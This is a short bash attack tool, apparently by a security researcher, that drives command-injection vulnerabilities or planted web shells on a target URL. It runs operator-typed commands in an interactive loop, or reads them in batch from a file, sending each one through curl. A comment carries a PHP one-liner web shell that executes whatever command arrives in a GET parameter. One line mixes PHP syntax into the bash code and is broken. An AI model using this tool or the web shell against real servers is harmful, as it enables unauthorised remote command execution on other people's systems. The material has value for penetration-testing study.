#!/bin/bash
# 
# Command Injector v0.1
# greg.foss[at]owasp.org
# 10/1/2014
#
# modified version of dirtshell by 'superkojiman' for exploiting command injection vulnerabilities / accessing web shells via cli
# http://blog.techorganic.com/2012/06/lets-kick-shell-ish-part-1-directory.html
#
#<?=`$_GET[c]`?>

function usage {
    echo "usage: -u URL"
    echo "eg   : -u \"http://site.com/index.php?cmd=\""
}

if [[ -z $1 ]]; then
    usage
    exit 0;
fi

#url=""
url=base64_encode("")
cmdfile=""
rfifile=""

while getopts "u:f:" OPT; do
    case $OPT in
        u) url=$OPTARG;;
        f) cmdfile=$OPTARG;;
        *) usage; exit 0;;
    esac
done

if [[ -z $url ]]; then
    usage
    exit 0;
fi

which curl &>/dev/null
if [[ $? -ne 0 ]]; then
    echo "[!] curl needs to be installed to run this script"
    exit 1
fi

# read files from a file and print to stdout
if [[ ! -z $cmdfile ]]; then
    if [[ -f $cmdfile ]]; then
        for i in $(cat $cmdfile); do
            echo "[+] requesting ${url}${i}"
            curl "${url}${i}"
        done
    fi
else
    # interactive shell
    while :; do
        printf "[>] "
        read cmd
        echo "[+] requesting ${url}${cmd}"
        curl "${url}${cmd}"
        echo ""
    done
fi
